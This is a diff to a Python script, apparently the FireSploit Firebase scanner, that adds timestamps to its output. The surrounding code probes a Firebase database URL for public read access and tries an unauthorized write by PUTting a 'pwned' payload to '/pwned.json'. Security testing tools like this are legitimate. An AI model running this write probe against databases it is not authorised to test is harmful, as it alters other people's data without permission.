@@ -10,11 +10,18 @@ GitHub: https://github.com/secshubhamsharma/FireSploit
 import requests
 import argparse
 import json
+from datetime import datetime
+
+
+def current_timestamp() -> str:
+    """Added this so that it can add the current data time"""
+    return datetime.now().isoformat()
 
 
 def check_public_read(database_url: str) -> bool:
     test_url = f"{database_url}/.json"
     print(f"\n[+] Checking public read access: {test_url}")
+    print(f"[*] Scan started at: {current_timestamp()}")
 
     try:
         response = requests.get(test_url, timeout=5)
@@ -34,13 +41,15 @@ def check_public_read(database_url: str) -> bool:
 
 def try_public_write(database_url: str) -> None:
     payload_url = f"{database_url}/pwned.json"
+    timestamp = current_timestamp()
     payload = {
         "pwned": True,
         "by": "FireSploit",
-        "date": "2025-07-04"
+        "timestamp": timestamp
     }
 
     print(f"\n[+] Attempting public write access: {payload_url}")
+    print(f"[*] Exploit attempted at: {timestamp}")
     try:
         response = requests.put(payload_url, json=payload, timeout=5)
         if response.status_code == 200:
@@ -67,6 +76,7 @@ def parse_arguments():
 
 def main():
     print("FireSploit Scanner v1.1")
+    print(f"[*] Executed at: {current_timestamp()}")
     args = parse_arguments()
     target_url = args.url.rstrip("/")
 
